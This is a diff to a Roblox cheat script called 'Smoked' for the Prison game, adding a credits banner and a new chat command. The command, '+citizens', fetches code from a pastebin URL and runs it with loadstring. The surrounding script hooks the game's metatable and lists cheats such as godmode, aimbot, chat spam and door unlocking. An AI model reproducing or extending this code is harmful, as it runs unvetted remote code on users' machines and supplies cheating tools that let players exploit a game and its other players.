@@ -1,3 +1,22 @@
+--[[
+Smoked, the Prison script.
+Creators of Smoked are: dollar#0007 and lilfatherfigure#5863 Thanks to bypass.
+This script will be updated every 2 days. So expect new stuff everday.
+Rip. VelyZena You Were A Good Friend.
+]]
+
+--[[
+███████╗███╗   ███╗ ██████╗ ██╗  ██╗███████╗██████╗ 
+██╔════╝████╗ ████║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
+███████╗██╔████╔██║██║   ██║█████╔╝ █████╗  ██║  ██║
+╚════██║██║╚██╔╝██║██║   ██║██╔═██╗ ██╔══╝  ██║  ██║
+███████║██║ ╚═╝ ██║╚██████╔╝██║  ██╗███████╗██████╔╝
+╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ 
+                                                    
+]]
+
+----------------
+
 local rm = getrawmetatable(game)
 local caller = checkcaller or is_protosmasher_caller
 local rindex = rm.__index
@@ -7775,6 +7794,14 @@ end
 end
 end)
 ---------------------------------------
+ game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+    
+if (string.lower(msg) == "+citizens") then
+				
+loadstring(game:HttpGet("https://pastebin.com/raw/WVS8kfme", true))()
+end
+end)
+---------
 
 print([[
          Cmds
@@ -7791,6 +7818,7 @@ Right Click - Unlock Door.
 G - Ws 90. (Nvm)
 -
 +hotkeys - Shows Hotkeys In Cool White Gui.
++citizens - Opens Up Best Script.
 +aidez - Opens Up Mega Combat v3. Known As Aidez.
 +korx - Trash Script But Has RunSpeed. Code Is "keithiscool"
 +psycho - Opens Up Decent Most Legit Script.
@@ -7817,7 +7845,7 @@ G - Ws 90. (Nvm)
 +godmode - Makes You Go Into Fucking God Mode.
 +aim <plr> - Aimbots Target.
 +spam - Spams Messages In Chat.
-+antife - Anti Feloop / anti naked guy lol.
++antife - Anti Feloop / anti naked guy lol
 -
 +flyspeed <num>
 +camlock <plr>
